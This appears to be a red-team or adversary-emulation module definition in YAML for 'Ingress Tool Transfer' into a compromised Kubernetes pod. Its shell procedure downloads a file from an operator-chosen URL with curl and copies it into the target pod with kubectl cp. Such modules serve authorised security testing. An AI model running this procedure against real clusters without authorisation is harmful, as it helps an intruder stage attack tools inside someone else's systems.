id: upload-tool-or-file-via-k8s
name: Upload Tool or File via k8s
description: Transfer tools or other files from an external system into a compromised environment.
tactic: Command And Control
techniques: ["Ingress Tool Transfer"]
parameters:
  K8S_AUTH:
    type: K8sAuth
    description: the Kubernetes identity selected by Authenticate As
  SRC_PATH:
    type: FileSource
    description: Absolute or relative operator-host path, or an HTTP(S) URL to download before copying
  DST_PATH:
    type: AbsolutePath
    description: Absolute path in the target pod
  POD_NAME:
    type: Pod
    description: Name of the target pod
    default: ${TARGET}
  NAMESPACE:
    type: Namespace
    description: Kubernetes namespace of the target pod
    default: ${NAMESPACE}
  Unpack:
    type: bool
    description: Flag if the file should be unpacked after transfer
  # DST_DIR:
  #   type: string
  #   description: Path on the target system where the file will be transfered
procedures:
  - key: kubectl
    isLocal: true
    command: |
      src={{ SRC_PATH | shell_quote }}
      destination={{ DST_PATH | shell_quote }}
      pod={{ POD_NAME | shell_quote }}
      namespace={{ NAMESPACE | shell_quote }}
      remote="${pod}:${destination}"
      case "$src" in
        http://*|https://*)
          tmp=$(mktemp "${TMPDIR:-/tmp}/ran-kubectl-cp.XXXXXX") || exit 1
          trap 'rm -f -- "$tmp"' EXIT HUP INT TERM
          curl --fail --location --silent --show-error --output "$tmp" -- "$src" &&
            kubectl ${K8S_AUTH} cp --namespace "$namespace" -- "$tmp" "$remote"
          ;;
        *)
          kubectl ${K8S_AUTH} cp --namespace "$namespace" -- "$src" "$remote"
          ;;
      esac
preconditions:
  accessLevel: user-exec
  kind: Pod
effects:
  - "sys.has-binary(${DST_PATH})"
